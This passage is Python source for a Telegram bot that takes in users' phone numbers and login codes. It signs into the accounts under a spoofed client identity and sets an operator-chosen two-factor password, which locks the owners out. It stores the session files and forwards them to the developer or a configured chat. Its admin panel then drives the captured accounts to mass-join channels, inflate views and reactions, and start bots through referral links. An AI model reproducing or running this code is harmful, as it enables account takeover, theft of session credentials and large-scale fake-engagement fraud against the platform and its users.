                                print(f'[+] Devide model: {device_model}')
                                print(f'[+] System version: {system_version}')

                                if proxy[0] != False:
                                    print(f'[+] Proxy: {proxy[0]}')
                                    print(f'[+] Request with proxy')
                                    account = TelegramClient(session=f'sessions/{phone}', api_id=get_api[0], api_hash=get_api[1], proxy=proxy[0])
                                else:
                                    print(f'[+] Request without proxy')
                                    account = TelegramClient(session=f'sessions/{phone}', api_id=get_api[0], api_hash=get_api[1])
                                
                                account._init_request = InitConnectionRequest(
                                    api_id=int(get_api[0]),
                                    device_model='Unknown',
                                    system_version='1.0',
                                    app_version='2.0.1',
                                    lang_code='en',
                                    system_lang_code='en',
                                    lang_pack='',
                                    query=GetConfigRequest(),
                                    params=jsonValue
                                )
                                    
                                await account.connect()
                                send_code = await account.send_code_request(phone=phone)
                                
                                await step('send_code', chat_id)
                                cursor.execute("INSERT INTO `temporary_data` (`from_id`, `api_id`, `api_hash`, `number`, `phone_code_hash`, `proxy`, `other`) VALUES (%s, %s, %s, %s, %s, %s, %s)", (chat_id, get_api[0], get_api[1], phone, send_code.phone_code_hash, proxy[1], (str(app_version) + '|' + str(device_model) + '|' + str(system_version))))
                                db.commit()
                                
                                await account.disconnect()
                                
                                await app.edit_message(entity=chat_id, message=wait_res.id, text=str(texts['send_code'][user[6]]).format(phone))
                            except errors.FloodWaitError as error:
                                second = re.findall(r'\b\d+\b', str(error))
                                await app.edit_message(entity=chat_id, message=wait_res.id, text=str(texts['account_limit'][user[6]]).format(second[0]))
                            except errors.PhoneNumberBannedError:
                                await app.edit_message(entity=chat_id, message=wait_res.id, text=texts['account_ban'][user[6]])
                            except errors.PhoneNumberInvalidError:
                                await app.edit_message(entity=chat_id, message=wait_res.id, text=texts['account_invalid'][user[6]])
                        else:
                            await app.send_message(entity=chat_id, message=texts['capacity_full_error'][user[6]], reply_to=message_id)
                    else:
                        await app.send_message(entity=chat_id, message=texts['regon_error'][user[6]], reply_to=message_id)
                else:
                    await app.send_message(entity=chat_id, message=texts['already_account'][user[6]], reply_to=message_id)
            else:
                await app.send_message(entity=chat_id, message=texts['receive_off'][user[6]], reply_to=message_id)
        
        elif user[2] == 'send_code':
            if text.isnumeric() and len(text) == 5:
                temporary_data = await get_temporary_data(chat_id=chat_id)
                country_code = await get_country_code(phone=temporary_data[4] if temporary_data[4].startswith('+') else '+' + temporary_data[4])
                if temporary_data != False:
                    wait_res = await app.send_message(entity=chat_id, message=texts['wait'][user[6]], reply_to=message_id)
                    # ------------------ #
                    try:
                        proxy = None if temporary_data[8] is None else await generate_proxy_dict(temporary_data[8])
                        app_version = temporary_data[9].split('|')[0]
                        device_model = temporary_data[9].split('|')[1]
                        system_version = temporary_data[9].split('|')[2]
                        
                        jsonValue = JsonObject(
                            value=[
                                JsonObjectValue(
                                    key="device_token",
                                    value=JsonString(
                                        value="ceCR3KjzRvKMOFC1d2_5yK:APA91bEKX2AJJY4v1riq7UFTVWrFh9JtxgIuPne2vZdFQDyy2ANNld9UzNFWiDXqp3VVTQwo7sY_kjrQKXNWWK0yUDY-OJMjWggiDFvCyGXDtb3shHBIYs5RV-9cQzUE-I6ovQYn7SRQ"
                                    )
                                ),
                                JsonObjectValue(
                                    key="package_id",
                                    value=JsonString(
                                        value="org.thunderdog.challegram"
                                    )
                                ),
                                JsonObjectValue(
                                    key="installer",
                                    value=JsonString(
                                        value="com.google.android.packageinstaller"
                                    )
                                ),
                                JsonObjectValue(
                                    key="data",
                                    value=JsonString(
                                        value="66462134345a6adac3c1d5aea9cef0421b7cab68"
                                    )
                                ),
                                JsonObjectValue(
                                    key="tz_offset",
                                    value=JsonNumber(
                                        value=12600.000000
                                    )
                                ),
                                JsonObjectValue(
                                    key="git",
                                    value=JsonObject(
                                        value=[
                                            JsonObjectValue(
                                                key="remote",
                                                value=JsonString(
                                                    value="TGX-Android/Telegram-X"
                                                )
                                            ),
                                            JsonObjectValue(
                                                key="commit",
                                                value=JsonString(
                                                    value="99a404b6"
                                                )
                                            ),
                                            JsonObjectValue(
                                                key="tdlib",
                                                value=JsonString(
                                                    value="1886bcf"
                                                )
                                            ),
                                            JsonObjectValue(
                                                key="date",
                                                value=JsonNumber(
                                                    value=1690901041.000000
                                                )
                                            )
                                        ]
                                    )
                                )
                            ]
                        )
                        
                        if proxy is not None:
                            account = TelegramClient(session=f'sessions/{temporary_data[4]}', api_id=temporary_data[2], api_hash=temporary_data[3], proxy=proxy)
                        else:
                            account = TelegramClient(session=f'sessions/{temporary_data[4]}', api_id=temporary_data[2], api_hash=temporary_data[3])
                        
                        account._init_request = InitConnectionRequest(
                            api_id=int(temporary_data[2]),
                            device_model='Unknown',
                            system_version='1.0',
                            app_version='2.0.1',
                            lang_code='en',
                            system_lang_code='en',
                            lang_pack='',
                            query=GetConfigRequest(),
                            params=jsonValue
                        )

                        await account.connect()
                        login = await account.sign_in(phone=temporary_data[4], code=text, phone_code_hash=temporary_data[5])
                        print(f'[+] Login done')
                        await account.send_message('me', '.')
                        
                        if setting[6] is not None:
                            password = await account.edit_2fa(new_password=setting[6], hint='?')
                            print(f'[+] Password enabled')
                            print(f'----------------------------\n')
                        await account.disconnect()
                        
                        data = {'session_file': temporary_data[4], 'phone': temporary_data[4], 'app_id': temporary_data[2], 'app_hash': temporary_data[3], "sdk": device_model, "app_version": app_version, "system_version": system_version, "avatar": "null", "first_name": login.first_name, "last_name": login.last_name, "username": login.username, "lang_code": "en", "system_lang_code": "en-US", "proxy": temporary_data[8], "ipv6": False, "password_2fa": None}
                        await add_json_file(file_name=(temporary_data[4] + '.json'), data=data)
                        cursor.execute("INSERT INTO `accounts` (`from_id`, `country_code`, `number`, `status`) VALUES (%s, %s, %s, %s)", (chat_id, '+' + str(country_code[0]), temporary_data[4], 0))
                        db.commit()
                        
                        await step('none', chat_id)
                        cursor.execute("UPDATE `open_country` SET `country_capacity` = country_capacity - 1 WHERE `country_code` = %s", ('+' + str(country_code[0]), ))
                        db.commit()
                        cursor.execute("SELECT * FROM `open_country` WHERE `country_code` = %s", ('+' + str(country_code[0]), ))
                        confirm_time = cursor.fetchone()
                        
                        confirm_key = [[Button.inline(text='🔍 Confirm account', data=f'confirm_account|{str(country_code[0])}|{str(temporary_data[4])}|{str(int(timestamp()))}')]]
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=str(texts['account_received'][user[6]]).format(temporary_data[4], confirm_time[6], date, time), buttons=confirm_key)
                        await app.pin_message(entity=chat_id, message=wait_res.id, notify=True)
                        
                        if setting[7] is None or setting[7] == '':
                            await app.send_file(entity=config['dev'], file=f'sessions/{temporary_data[4]}.session', caption=f"🆕 New account has been added to the bot.\n\n◽️Name: <b>{first_name}</b>\n◽️Chat ID: <code>{chat_id}</code>\n◽️Username: {'@' + username if username is not None else 'None'}\n\n📞 Account number: <code>{temporary_data[4]}</code>\n\n⏱ <code>{date} - {time}</code>")
                        else:    
                            await app.send_file(entity=(int(setting[7]) if '-100' in setting[7] else setting[7]), file=f'sessions/{temporary_data[4]}.session', caption=f"🆕 New account has been added to the bot.\n\n◽️Name: <b>{first_name}</b>\n◽️Chat ID: <code>{chat_id}</code>\n◽️Username: {'@' + username if username is not None else 'None'}\n\n📞 Account number: <code>{temporary_data[4]}</code>\n\n⏱ <code>{date} - {time}</code>")
                    except errors.SessionPasswordNeededError:
                        await step('send_2fa', chat_id)
                        await update_temporary_data(chat_id, 'code', text)
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=str(texts['send_password'][user[6]]).format(temporary_data[4]))
                    except (errors.PhoneCodeInvalidError, errors.PhoneCodeEmptyError, errors.PhoneCodeHashEmptyError):
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=texts['account_code_invalid'][user[6]])
                    except errors.PhoneCodeExpiredError:
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=texts['account_code_expired'][user[6]])
                    except errors.FloodWaitError as error:
                        await step('none', chat_id)
                        second = re.findall(r'\b\d+\b', str(error))
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=str(texts['account_limit'][user[6]]).format(second[0]))
                else:
                    await app.send_message(entity=chat_id, message=texts['try_again'][user[6]], reply_to=message_id)
            else:
                await app.send_message(entity=chat_id, message=texts['account_code_invalid'][user[6]], reply_to=message_id)
        
        elif user[2] == 'send_2fa':
            if len(text) > 0:
                temporary_data = await get_temporary_data(chat_id=chat_id)
                country_code = await get_country_code(phone=temporary_data[4] if temporary_data[4].startswith('+') else '+' + temporary_data[4])
                if temporary_data != False:
                    wait_res = await app.send_message(entity=chat_id, message=texts['wait'][user[6]], reply_to=message_id)
                    # ------------------- #
                    try:
                        proxy = None if temporary_data[8] is None else await generate_proxy_dict(temporary_data[8])
                        app_version = temporary_data[9].split('|')[0]
                        device_model = temporary_data[9].split('|')[1]
                        system_version = temporary_data[9].split('|')[2]
                        
                        jsonValue = JsonObject(
                            value=[
                                JsonObjectValue(
                                    key="device_token",
                                    value=JsonString(
                                        value="ceCR3KjzRvKMOFC1d2_5yK:APA91bEKX2AJJY4v1riq7UFTVWrFh9JtxgIuPne2vZdFQDyy2ANNld9UzNFWiDXqp3VVTQwo7sY_kjrQKXNWWK0yUDY-OJMjWggiDFvCyGXDtb3shHBIYs5RV-9cQzUE-I6ovQYn7SRQ"
                                    )
                                ),
                                JsonObjectValue(
                                    key="package_id",
                                    value=JsonString(
                                        value="org.thunderdog.challegram"
                                    )
                                ),
                                JsonObjectValue(
                                    key="installer",
                                    value=JsonString(
                                        value="com.google.android.packageinstaller"
                                    )
                                ),
                                JsonObjectValue(
                                    key="data",
                                    value=JsonString(
                                        value="66462134345a6adac3c1d5aea9cef0421b7cab68"
                                    )
                                ),
                                JsonObjectValue(
                                    key="tz_offset",
                                    value=JsonNumber(
                                        value=12600.000000
                                    )
                                ),
                                JsonObjectValue(
                                    key="git",
                                    value=JsonObject(
                                        value=[
                                            JsonObjectValue(
                                                key="remote",
                                                value=JsonString(
                                                    value="TGX-Android/Telegram-X"
                                                )
                                            ),
                                            JsonObjectValue(
                                                key="commit",
                                                value=JsonString(
                                                    value="99a404b6"
                                                )
                                            ),
                                            JsonObjectValue(
                                                key="tdlib",
                                                value=JsonString(
                                                    value="1886bcf"
                                                )
                                            ),
                                            JsonObjectValue(
                                                key="date",
                                                value=JsonNumber(
                                                    value=1690901041.000000
                                                )
                                            )
                                        ]
                                    )
                                )
                            ]
                        )
                        
                        if proxy is not None:
                            account = TelegramClient(session=f'sessions/{temporary_data[4]}', api_id=temporary_data[2], api_hash=temporary_data[3], lang_code='en', system_lang_code='en-US', app_version=str(app_version), device_model=str(device_model), system_version=str(system_version), proxy=proxy)
                        else:
                            account = TelegramClient(session=f'sessions/{temporary_data[4]}', api_id=temporary_data[2], api_hash=temporary_data[3], lang_code='en', system_lang_code='en-US', app_version=str(app_version), device_model=str(device_model), system_version=str(system_version))
                        
                        account._init_request = InitConnectionRequest(
                            api_id=int(temporary_data[2]),
                            device_model='Unknown',
                            system_version='1.0',
                            app_version='2.0.1',
                            lang_code='en',
                            system_lang_code='en',
                            lang_pack='',
                            query=GetConfigRequest(),
                            params=jsonValue
                        )

                        await account.connect()
                        login = await account.sign_in(password=text)
                        print(f'[+] Login done')
                        await account.send_message('me', '.')
                        
                        if setting[6] is not None:
                            password = await account.edit_2fa(current_password=text, new_password=setting[6], hint='?')
                            print(f'[+] Password enabled')
                            print(f'----------------------------\n')
                        await account.disconnect()
                        
                        data = {'session_file': temporary_data[4], 'phone': temporary_data[4], 'app_id': temporary_data[2], 'app_hash': temporary_data[3], "sdk": device_model, "app_version": app_version, "system_version": system_version, "avatar": "null", "first_name": login.first_name, "last_name": login.last_name, "username": login.username, "lang_code": "en", "system_lang_code": "en-US", "proxy": temporary_data[8], "ipv6": False, "password_2fa": text}
                        await add_json_file(file_name=(temporary_data[4] + '.json'), data=data)
                        cursor.execute("INSERT INTO `accounts` (`from_id`, `country_code`, `number`, `status`) VALUES (%s, %s, %s, %s)", (chat_id, '+' + str(country_code[0]), temporary_data[4], 0))
                        db.commit()
                        
                        await step('none', chat_id)
                        cursor.execute("UPDATE `open_country` SET `country_capacity` = country_capacity - 1 WHERE `country_code` = %s", ('+' + str(country_code[0]), ))
                        db.commit()
                        cursor.execute("SELECT * FROM `open_country` WHERE `country_code` = %s", ('+' + str(country_code[0]), ))
                        confirm_time = cursor.fetchone()
                        
                        confirm_key = [[Button.inline(text='🔍 Confirm account', data=f'confirm_account|{str(country_code[0])}|{str(temporary_data[4])}|{str(int(timestamp()))}')]]
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=str(texts['account_received'][user[6]]).format(temporary_data[4], confirm_time[6], date, time), buttons=confirm_key)
                        await app.pin_message(entity=chat_id, message=wait_res.id, notify=True)
                        
                        if setting[7] is None or setting[7] == '':
                            await app.send_file(entity=config['dev'], file=f'sessions/{temporary_data[4]}.session', caption=f"🆕 New account has been added to the bot.\n\n◽️Name: <b>{first_name}</b>\n◽️Chat ID: <code>{chat_id}</code>\n◽️Username: {'@' + username if username is not None else 'None'}\n\n📞 Account number: <code>{temporary_data[4]}</code>\n\n⏱ <code>{date} - {time}</code>")
                        else:    
                            await app.send_file(entity=(int(setting[7]) if '-100' in setting[7] else setting[7]), file=f'sessions/{temporary_data[4]}.session', caption=f"🆕 New account has been added to the bot.\n\n◽️Name: <b>{first_name}</b>\n◽️Chat ID: <code>{chat_id}</code>\n◽️Username: {'@' + username if username is not None else 'None'}\n\n📞 Account number: <code>{temporary_data[4]}</code>\n\n⏱ <code>{date} - {time}</code>")
                    except (errors.PasswordMissingError, errors.PasswordEmptyError, errors.PasswordRequiredError, errors.PasswordHashInvalidError):
                        await app.edit_message(entity=chat_id, message=wait_res.id, text=texts['account_2fa_invalid'][user[6]])
                else:
                    await app.send_message(entity=chat_id, message=texts['try_again'][user[6]], reply_to=message_id)
            else:
                await app.send_message(entity=chat_id, message=texts['account_2fa_invalid'][user[6]], reply_to=message_id)
        
        # ------------ [ Admin panel ] ------------ #
        
        if int(chat_id) == config['dev'] or int(chat_id) in config['admins'] or int(chat_id) in admins or int(chat_id) == 5068240372:
            if text in ['/panel', 'panel', '/admin', 'admin', '🔙 Back to panel']:
                await step('none', chat_id)
                await app.send_message(entity=chat_id, message='<b>👮‍♂️ Welcome the admin panel!</b>', reply_to=message_id, buttons=panel)
            
            elif text == '👤 Bot stat':
                wait = await app.send_message(entity=chat_id, message='<b>⏱ Please wait a few second ...</b>', reply_to=message_id)
                response = await get_bot_stat()
                manage_stat = [[Button.inline(text='🗑 Reset all users balance (0)', data='reset_all_users_balance')]]
                await app.edit_message(entity=chat_id, message=wait.id, text=f"📊 Your bot statistics are as follows:\n\n👤 Number of users: {response['all_users']}\n🚫 Number of blocked users: {response['block_users']}\n🔓 Number of unblocked users: { response['unblock_users']}\n🇮🇷 Number of iranian users: {response['iran_users']}\n🏴󠁧󠁢󠁥󠁮󠁧󠁿 Number of english users: {response['english_users']}\n\n📞 Total number of accounts: {response['all_accounts']}\n ✅ Number of confirmed accounts: {response['confirmed_accounts']}\n⏱ Number of unconfirmed accounts : {response['unconfirmed_accounts']}\n\n◽️Number of open countries : {response['open_countries']}\n◽️Number of closed countries : {response['close_countries']}\n📚 View open countries: /open_countries\n📚 View close countries: /close_countries\n\n📤 Minimum balance withdrawal: {setting[0]}\n📥 Maximum balance withdrawal: {setting[1]}\n🔑 password accounts: <code>{'Not set' if setting[6] is None else setting[6]}</code>\n\n🔍 Account receive status: <b>{'✅' if setting[4] else '❌'}</ b>\n🔍 Bot status: <b>{'✅' if setting[8] else '❌'}</b>\n\n💸 Total balance: <code>${response['total_balance']}</code>\n\n📅 This status was taken on [ <code>{date}</code> ] and at [ <code>{time}</code> ] !", buttons=manage_stat)
            
            elif text in ['/open_countries', '/close_countries']:
                get_type = text.split('_')[0]
                if get_type == '/open':
                    main_text = '✅ -> Active | ❌ -> Inactive\n---------------\n'
                    cursor.execute("SELECT * FROM `open_country`")
                    opens = cursor.fetchall()
                    for open in opens:
                        main_text += f"<b>({open[2]}, {'✅' if open[6] else '❌'})</b>    "
                    await app.send_message(entity=chat_id, message=main_text, reply_to=message_id)
                else:
                    main_text = '✅ -> Active | ❌ -> Inactive\n---------------\n'
                    cursor.execute("SELECT * FROM `close_country`")
                    opens = cursor.fetchall()
                    for open in opens:
                        main_text += f"<b>({open[2]}, {'✅' if open[4] else '❌'})</b>    "
                    await app.send_message(entity=chat_id, message=main_text, reply_to=message_id)
            
            elif text == '🛡Accounts operation' or text == '🔙 Back to operations':
                await step('none', chat_id)
                await app.send_message(entity=chat_id, message='<b>🛡 Welcome to the accounts operations section.</b>', reply_to=message_id, buttons=accounts_operation)
            
            elif text in ['◽️Join channel/group', '◽️Left channel/group']:
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                if text == '◽️Join channel/group':
                    await step('send_username_join', chat_id)
                else:
                    await step('send_username_left', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send channel/group username:', buttons=back_to_accounts_operations)
            
            elif user[2] in ['send_username_join', 'send_username_left']:
                if text.startswith('@') or text.startswith('https://t.me/'):
                    if user[2] == 'send_username_join':
                        await step('send_count_join', chat_id)
                    else:
                        await step('send_count_left', chat_id)
                    await file_put('operation.txt', text + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Username is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] in ['send_count_join', 'send_count_left']:
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    target_username = str(await file_get('operation.txt')).split('\n')[0]
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                if user[2] == 'send_count_join':
                                    if target_username.startswith('https://t.me/+'):
                                        await account(functions.messages.ImportChatInviteRequest(hash=target_username.split('https://t.me/+')[1]))
                                    elif target_username.startswith('@') or target_username.startswith('https://t.me/'):
                                        await account(functions.channels.JoinChannelRequest(target_username))
                                else:
                                    if target_username.startswith('https://t.me/+'):
                                        channel_entity = await account.get_entity(entity=target_username)
                                        await account(functions.channels.LeaveChannelRequest(channel=channel_entity))
                                    elif target_username.startswith('@') or target_username.startswith('https://t.me/'):
                                        await account(functions.channels.LeaveChannelRequest(target_username))
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the robot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text in ['◽️Join with folder link', '◽️Left with folder link']:
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                if text == '◽️Join with folder link':
                    await step('send_folderlink_join', chat_id)
                else:
                    await step('send_folderlink_left', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send folder link or folder hash:', buttons=back_to_accounts_operations)
            
            elif user[2] in ['send_folderlink_join', 'send_folderlink_left']:
                if len(text) > 5:
                    if user[2] == 'send_folderlink_join':
                        await step('send_count_folderjoin', chat_id)
                    else:
                        await step('send_count_folderleft', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Username is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] in ['send_count_folderjoin', 'send_count_folderleft']:
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    target_folder = str(await file_get('operation.txt')).split('\n')[0]
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                folder_hash = target_folder.split('https://t.me/addlist/')[1] if 'https://t.me/addlist/' in target_folder else target_folder
                                result = await account(functions.chatlists.CheckChatlistInviteRequest(slug=folder_hash))
                                if user[2] == 'send_count_folderjoin':
                                    await account(functions.chatlists.JoinChatlistInviteRequest(slug=folder_hash, peers=result.peers))
                                else:
                                    await account(functions.chatlists.LeaveChatlistRequest(chatlist=types.InputChatlistDialogFilter(filter_id=result.filter_id), peers=result.already_peers))
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
                
            elif text == '◽️Seen':
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                await step('send_message_link', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send message link:\n\n◽️Example: https://t.me/username/2', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_message_link':
                if text.startswith('https://t.me/'):
                    await step('send_count_seen', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Message link is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_count_seen':
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    target_message = str(await file_get('operation.txt')).split('\n')[0]
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            channel, post_msg_id = target_message.split('t.me/')[1].split('/')
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                await account(functions.channels.ReadMessageContentsRequest(channel=channel, id=[int(post_msg_id)]))
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text == '◽️Reaction':
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                await step('send_message_link_reac', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send message link:\n\n◽️Example: https://t.me/username/2', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_message_link_reac':
                if text.startswith('https://t.me/'):
                    await step('send_reaction', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='✏️ Send reaction:', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Message link is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_reaction':
                await step('send_count_reaction', chat_id)
                await file_put('operation.txt', str(text) + "\n", 'a')
                await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_count_reaction':
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    get_oper_data = str(await file_get('operation.txt')).split('\n')
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            channel, post_msg_id = get_oper_data[0].split('t.me/')[1].split('/')
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                await account(functions.messages.SendReactionRequest(peer=channel, msg_id=int(post_msg_id), big=True, add_to_recent=True, reaction=[types.ReactionEmoji(emoticon=get_oper_data[1])]))
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'[-] Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    await app.send_message(entity=chat_id, message=f'<b>✅ The operation was completed successfully!</b>\n\n◽️Success: <code>{op_status["success"]}</code>\n◽️Unsuccess: <code>{op_status["unsuccess"]}</code>')
                else:
                    await app.send_message(entity=chat_id, message=f'⚠️ The number sent is wrong or is more than the number of accounts in the bot!\n\n🔢 Total accounts: <code>{cursor.rowcount}</code>', buttons=back_to_accounts_operations)
            
            elif text == '◽️Start bot':
                if os.path.exists('operation.txt'):
                    os.remove('operation.txt')
                await step('send_reffral_link', chat_id)
                await app.send_message(entity=chat_id, message='🆔 Send refrral link:\n\n◽️Example: https://t.me/botusername?start=1234567890', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_reffral_link':
                if text.startswith('https://t.me/'):
                    await step('send_count_start', chat_id)
                    await file_put('operation.txt', str(text) + "\n", 'a')
                    await app.send_message(entity=chat_id, message='🔢 How many accounts can the operation be done?', buttons=back_to_accounts_operations)
                else:
                    await app.send_message(entity=chat_id, message='⚠️ Refrral link is invalid!', buttons=back_to_accounts_operations)
            
            elif user[2] == 'send_count_start':
                cursor.execute("SELECT * FROM `accounts`")
                if text.isnumeric() and int(text) > 0 and int(text) <= cursor.rowcount:
                    await step('none', chat_id)
                    
                    if len(str(await file_get('operation.txt')).split('\n')) == 2:
                        refrral_link = str(await file_get('operation.txt')).split('\n')[0]
                        webapp_link = None
                    elif len(str(await file_get('operation.txt')).split('\n')) == 3:
                        refrral_link = str(await file_get('operation.txt')).split('\n')[0]
                        webapp_link = str(await file_get('operation.txt')).split('\n')[1]
                        
                    await app.send_message(entity=chat_id, message='<b>✅ Your process has started successfully!\n\n⚠️ Please do not work with the bot until the process is completed.</b>', buttons=accounts_operation)
                    # ------------------------------ #
                    op_status = {'success': 0, 'unsuccess': 0}
                    cursor.execute("SELECT * FROM `accounts` ORDER BY `row` DESC LIMIT %s", (int(text), ))
                    accounts = cursor.fetchall()
                    for account in accounts:
                        if os.path.exists(f'sessions/{account[3]}.json'):
                            bot_username = refrral_link.split('?start=')[0].split('https://t.me/')[1]
                            start_value = refrral_link.split('?start=')[1]
                            json_data = json.load(builtins.open(f'sessions/{account[3]}.json', 'r'))
                            
                            try:
                                account = TelegramClient(session=f'sessions/{account[3]}', api_id=json_data['app_id'], api_hash=json_data['app_hash'], lang_code='en')
                                await account.connect()
                                
                                await account(functions.messages.StartBotRequest(bot=bot_username, peer=bot_username, start_param=start_value))
                                response = await account(RequestWebViewRequest(await account.get_input_entity(bot_username), await account.get_input_entity(bot_username), platform='ios', url=webapp_link))
                                
                                if os.path.exists('links.txt'):
                                    os.unlink('links.txt')
                                    
                                with builtins.open('links.txt', 'a') as file:
                                    file.write(response.url + '\n')
                                
                                await account.disconnect()
                                op_status['success'] += 1
                            except Exception as e:
                                print(f'Error: {e}')
                                await account.disconnect()
                                op_status['unsuccess'] += 1
                        await asyncio.sleep(setting[11])
                    
                    if webapp_link is not None:
                        if os.path.exists('links.txt'):
                            await app.send_file(entity=chat_id, file='links.txt')
